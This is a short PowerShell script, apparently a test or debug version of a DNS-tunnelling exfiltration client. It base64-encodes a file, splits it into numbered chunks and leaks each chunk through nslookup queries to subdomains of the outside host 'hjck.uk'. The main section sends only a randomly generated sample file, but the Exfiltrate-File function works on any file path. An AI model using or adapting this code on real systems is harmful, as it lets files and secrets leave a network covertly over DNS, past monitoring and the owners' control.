# client_exfil_safe_debug.ps1

$HOSTNAME = "hjck.uk"
$CHUNK_SIZE = 50
$SPLIT_EVERY = 1

function Create-RandomFile {
    param (
        [string]$Filename = "samplefile.txt",
        [int]$Size = 1000
    )
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    $data = -join ((1..$Size) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    Set-Content -Path $Filename -Value $data
    return $Filename
}

function Exfiltrate-File {
    param (
        [string]$FilePath,
        [string]$Hostname,
        [int]$ChunkSize,
        [int]$SplitEvery
    )
    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath) + "_" + [System.IO.Path]::GetExtension($FilePath).TrimStart('.')
    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
    $encoded = [System.Convert]::ToBase64String($bytes)

    $chunks = @()
    for ($i = 0; $i -lt $encoded.Length; $i += $ChunkSize) {
        $prefix = "{0:D4}" -f $i
        $chunk = $encoded.Substring($i, [Math]::Min($ChunkSize, $encoded.Length - $i))
        $chunks += "$prefix$chunk"
    }

    for ($i = 0; $i -lt $chunks.Count; $i += $SplitEvery) {
        $batch = $chunks[$i..([Math]::Min($i + $SplitEvery - 1, $chunks.Count - 1))]
        $domain = ($batch + $filename + $Hostname) -join "."
        Send-DnsQuery -Domain $domain
    }
}

function Send-DnsQuery {
    param (
        [string]$Domain
    )
    $domain = $Domain.TrimEnd('.') + "."
    Write-Host "[DEBUG] Query domain: $domain"
    try {
        nslookup $domain | Out-Null
        Write-Host "[+] Sent: $domain"
    }
    catch {
        Write-Host "[-] Failed to send query for $domain: $_"
    }
}

# Main
$file_to_exfil = Create-RandomFile
Exfiltrate-File -FilePath $file_to_exfil -Hostname $HOSTNAME -ChunkSize $CHUNK_SIZE -SplitEvery $SPLIT_EVERY
